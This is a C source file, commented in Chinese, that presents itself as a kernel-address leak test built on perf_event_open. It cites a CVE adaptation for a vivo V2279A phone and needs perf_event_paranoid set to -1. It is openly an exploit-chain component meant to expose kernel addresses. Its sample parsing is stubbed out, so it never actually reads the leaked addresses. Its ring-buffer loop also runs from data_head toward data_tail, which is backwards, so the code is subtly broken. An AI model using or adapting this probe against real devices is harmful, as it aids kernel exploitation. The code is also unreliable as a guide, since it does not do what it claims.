/*
 * test_perf_leak.c - 使用 perf_event_open 泄漏内核地址
 *
 * 基于 vivo V2279A 适配记录:
 * https://qhyz.holyfun.cn/CVE202643499.html
 *
 * 条件: perf_event_paranoid = -1
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <errno.h>

#define PAGE_SIZE 4096
#define MMAP_SIZE (1 + 16) * PAGE_SIZE  // header + 16 pages

// perf_event_open syscall
static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

// 读取 perf ring buffer
struct perf_event_mmap_page *perf_mmap = NULL;
uint64_t *perf_data = NULL;
int perf_fd = -1;

int init_perf(void) {
    printf("=== 初始化 perf_event_open ===\n");

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));

    attr.size = sizeof(attr);
    attr.type = PERF_TYPE_SOFTWARE;  // 使用 SOFTWARE 类型
    attr.config = PERF_COUNT_SW_PAGE_FAULTS_MAJ;
    attr.sample_period = 100;
    attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    attr.sample_max_stack = 24;
    attr.exclude_user = 0;  // 包含用户态
    attr.exclude_hv = 1;
    attr.exclude_kernel = 0;

    perf_fd = perf_event_open(&attr, 0, -1, -1, PERF_FLAG_FD_CLOEXEC);
    if (perf_fd < 0) {
        printf("  perf_event_open (SOFTWARE) 失败: %s (errno=%d)\n", strerror(errno), errno);

        // 尝试其他配置
        printf("  尝试其他配置...\n");

        attr.type = PERF_TYPE_SOFTWARE;
        attr.config = PERF_COUNT_SW_CPU_CLOCK;
        attr.sample_period = 1000;
        attr.sample_type = PERF_SAMPLE_IP;
        attr.exclude_user = 1;
        attr.exclude_kernel = 0;

        perf_fd = perf_event_open(&attr, 0, -1, -1, PERF_FLAG_FD_CLOEXEC);
        if (perf_fd < 0) {
            printf("  perf_event_open (CPU_CLOCK) 失败: %s (errno=%d)\n", strerror(errno), errno);
            return -1;
        }
    }

    printf("  perf_fd = %d\n", perf_fd);

    // mmap ring buffer
    perf_mmap = mmap(NULL, MMAP_SIZE, PROT_READ, MAP_SHARED, perf_fd, 0);
    if (perf_mmap == MAP_FAILED) {
        printf("  mmap 失败: %s\n", strerror(errno));
        close(perf_fd);
        return -1;
    }

    printf("  mmap 成功: %p\n", perf_mmap);

    // 数据区在 mmap_page + 1 页开始
    perf_data = (uint64_t *)((char *)perf_mmap + PAGE_SIZE);

    return 0;
}

// 启用 perf
void enable_perf(void) {
    ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
}

// 禁用 perf
void disable_perf(void) {
    ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
}

// 读取样本
int read_samples(void) {
    printf("\n=== 读取 perf 样本 ===\n");

    struct perf_event_header *header;
    int count = 0;
    uint64_t offset = perf_mmap->data_head;
    uint64_t tail = perf_mmap->data_tail;

    printf("  data_head: %llu\n", offset);
    printf("  data_tail: %llu\n", tail);

    while (offset != tail) {
        header = (struct perf_event_header *)((char *)perf_data + (offset % (16 * PAGE_SIZE)));

        if (header->type == PERF_RECORD_SAMPLE) {
            // 解析样本
            uint64_t ip = 0;
            uint64_t *data = (uint64_t *)((char *)header + sizeof(*header));

            // 解析 perf_event_attr 的 sample_type
            // PERF_SAMPLE_IP: IP 值
            // PERF_SAMPLE_CALLCHAIN: 调用链

            count++;
            if (count <= 10) {
                printf("  [%d] header->type=%u size=%u\n",
                       count, header->type, header->size);
            }
        }

        offset += header->size;
    }

    printf("  总共读取 %d 个样本\n", count);
    return count;
}

// 主函数
int main(void) {
    printf("=== perf_event_open 内核地址泄漏测试 ===\n");
    printf("PID: %d\n\n", getpid());

    // 检查 perf_event_paranoid
    int fd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY);
    if (fd >= 0) {
        char buf[32];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("perf_event_paranoid: %s", buf);
        }
    }

    // 初始化 perf
    if (init_perf() < 0) {
        printf("初始化失败\n");
        return 1;
    }

    // 启用 perf 并触发一些内核活动
    enable_perf();

    // 触发内核活动
    for (int i = 0; i < 1000000; i++) {
        syscall(SYS_getpid);
    }

    disable_perf();

    // 读取样本
    read_samples();

    // 清理
    if (perf_mmap != MAP_FAILED) {
        munmap(perf_mmap, MMAP_SIZE);
    }
    if (perf_fd >= 0) {
        close(perf_fd);
    }

    printf("\n=== 测试完成 ===\n");
    return 0;
}
